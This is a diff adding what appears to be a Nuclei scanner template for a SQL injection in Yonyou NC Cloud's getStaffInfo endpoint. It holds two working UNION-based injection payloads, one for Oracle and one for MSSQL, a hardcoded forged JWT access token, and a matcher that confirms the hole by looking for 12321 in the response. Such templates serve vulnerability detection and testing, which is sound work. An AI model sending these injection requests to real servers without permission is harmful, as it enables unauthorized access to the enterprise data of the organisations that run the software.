@@ -1,0 +1,27 @@
+id: yonyou-nc-cloud-getStaffInfo-sqli
+
+info:
+  name: yonyou-nc-cloud-getStaffInfo-sqli
+  author: yonyou-nc-cloud-getStaffInfo-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /ncchr/attendstaff/getStaffInfo?id={{url_encode("1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(113)||CHR(113)||CHR(107)||CHR(113)||NVL(CAST(111*111 AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(106)||CHR(106)||CHR(118)||CHR(113),NULL,NULL,NULL,NULL,NULL FROM DUAL-- zhXX")}} HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+      - |
+        GET /ncchr/attendstaff/getStaffInfo?id={{url_encode("1\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)+ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IYlM")}} HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+  
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        condition: or
+        dsl:
+          - contains(body,"12321")
+          
